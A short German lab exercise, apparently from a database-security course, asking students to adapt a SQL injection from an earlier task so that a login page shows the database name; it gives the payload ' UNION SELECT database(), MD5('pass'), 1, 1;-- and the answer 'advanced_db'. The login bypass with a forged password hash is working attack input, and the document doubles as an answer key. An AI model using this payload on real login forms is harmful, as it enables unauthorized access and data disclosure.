Ändern Sie das Statement aus Aufgabe 2.1 so ab, dass Ihnen anstatt Ihres Nutzernamens beim erfolgreichen Login der Datenbankname angezeigt wird.

Tipp:
Verwenden Sie den Befehl `SELECT database();`.

Statement:
' UNION SELECT database(), MD5('pass'), 1, 1;--

>>3) Wie lautet der Name der Datenbank?<<
=== advanced_db
